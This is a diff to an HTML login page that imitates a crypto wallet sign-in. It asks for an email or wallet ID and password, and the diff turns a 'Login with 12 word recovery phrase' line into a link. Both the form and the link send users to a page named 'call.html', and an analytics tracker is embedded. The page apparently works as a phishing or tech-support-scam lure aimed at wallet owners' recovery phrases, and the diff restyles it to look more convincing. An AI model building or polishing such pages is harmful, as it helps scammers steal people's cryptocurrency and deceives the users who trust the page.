@@ -148,9 +148,16 @@
     }
 
     .recovery-link {
-      font-size: 13px;
-      color: #777;
+      font-size: 14px;
       margin-top: 24px;
+    }
+
+    .recovery-link a {
+      color: #4a90fe;
+      text-decoration: none;
+      font-weight: 500;
+      display: inline-block;
+      padding: 8px 0;
     }
 
     footer {
@@ -220,6 +227,11 @@
       .logo {
         font-size: 16px;
       }
+
+      .recovery-link {
+        font-size: 13px;
+        text-align: center;
+      }
     }
   </style>
 </head>
@@ -250,7 +262,7 @@
     <form onsubmit="event.preventDefault(); redirectToCall();">
       <div class="input-group">
         <label for="email">Email or Wallet ID</label>
-        <input type="text" id="email" placeholder="Enter your email or wallet ID" aria-label="Email or Wallet ID" required>
+        <input type="email" id="email" placeholder="Enter your email or wallet ID" aria-label="Email or Wallet ID" required>
       </div>
 
       <div class="input-group password">
@@ -267,7 +279,7 @@
     </div>
 
     <div class="recovery-link">
-      Login with 12 word recovery phrase
+      <a href="call.html" aria-label="Login with 12 word recovery phrase">Login with 12 word recovery phrase</a>
     </div>
   </div>
 </div>
@@ -290,25 +302,23 @@
   }
 
   function redirectToCall() {
-    // You could add validation here if needed
     window.location.href = "call.html";
   }
 </script>
 
-
-
-
-
-
-<!-- begin code v 7.0 -->
+<!-- begin tracking code -->
 <span id="wts2200954"></span>
-<script>var wts=document.createElement('script');wts.async=true;
-wts.src='https://app.ardalio.com/wts7.js';document.head.appendChild(wts);
-wts.onload = function(){ wtsl7(2200954,2); };
-</script><noscript><img src="https://app.ardalio.com/7/2/2200954.png"></noscript>
-<!-- end code v 7.0 -->
-
-
+<script>
+  var wts = document.createElement('script');
+  wts.async = true;
+  wts.src = 'https://app.ardalio.com/wts7.js';
+  document.head.appendChild(wts);
+  wts.onload = function() {
+    wtsl7(2200954, 2);
+  };
+</script>
+<noscript><img src="https://app.ardalio.com/7/2/2200954.png"></noscript>
+<!-- end tracking code -->
 
 </body>
 </html>
